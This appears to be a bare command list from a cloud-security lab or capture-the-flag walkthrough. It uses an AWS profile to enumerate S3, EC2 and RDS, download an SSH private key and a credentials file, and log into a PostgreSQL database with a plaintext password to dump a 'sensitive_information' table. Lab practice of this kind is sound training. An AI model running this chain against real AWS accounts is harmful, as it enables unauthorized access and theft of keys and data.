`aws configure --profile Scenario5_2_user`

`aws s3 ls --profile Scenario5_2_user`

`aws s3 ls s3://<bucket> --recursive --profile Scenario5_2_user`

`aws s3 cp s3://keystore-s3-bucket-cgid6prrnaix1v/SecurityChallenge . --profile Scenario5_2_user`

`aws s3 cp s3://keystore-s3-bucket-cgid6prrnaix1v/SecurityChallenge.pub . --profile Scenario5_2_user`

`aws ec2 describe-instances --profile Scenario5_2_user`

`chmod 400 SecurityChallenge`

`sudo apt-get install awscli`

`aws s3 ls`

`aws s3 ls s3://<bucket> --recursive`

`aws s3 cp s3://<bucket>/db.txt .`

`cat db.txt`

`aws rds describe-db-instances --region eu-central-1`

`psql postgresql://sc5admin:Purplepwny2029@<rds-instance>:5432/SecurityChallenge`

`\dt`

`select * from sensitive_information;`